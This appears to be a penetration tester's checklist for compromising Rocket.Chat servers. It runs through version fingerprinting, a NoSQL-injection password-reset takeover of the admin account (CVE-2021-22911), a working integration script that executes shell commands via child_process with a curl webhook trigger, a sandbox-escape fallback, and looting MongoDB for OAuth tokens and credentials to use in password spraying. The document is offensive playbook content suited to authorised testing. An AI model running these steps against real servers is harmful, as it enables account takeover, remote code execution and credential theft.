# Rocket.Chat

## Before I start
- [ ] Port 3000; version: curl -s http://target:3000/api/info | jq .version
- [ ] Registration open → account → read channels (creds, hostnames, runbooks in chat history)

## CVE-2021-22911 (3.12/3.13 era, unauth)
- [ ] NoSQLi in password reset → leak reset token char-by-char ($regex oracle): :Pb nosqli
- [ ] searchsploit rocket.chat — PoCs automate the loop
- [ ] Result: reset the ADMIN password → full workspace

## Admin → RCE (Integrations)
- [ ] Administration → Integrations → New → Incoming → script section
class Script { process_incoming_request({ request }) { return { content: { text: require('child_process').execSync('id').toString() } }; } }
- [ ] Fire the webhook: curl -X POST http://target:3000/hooks/<token>/<id>
- [ ] require blocked on hardened builds → old vm2 escapes (this.constructor.constructor)
- [ ] Check version, then searchsploit: :Pb web-cves

## Post-foothold loot
- [ ] MONGO_URL in service env → the whole workspace DB: :Pb mongodb
- [ ] Users, messages, uploads, OAuth tokens all in Mongo
- [ ] rocketchat user shell → :Pb linux-enum

## If it fails
- [ ] Patched + registration closed → chat is a cred source, not a door; look elsewhere first

## Next
- [ ] Chat loot = spray material: :Pb spraying
- [ ] Mongo access → user-table manipulation, more creds
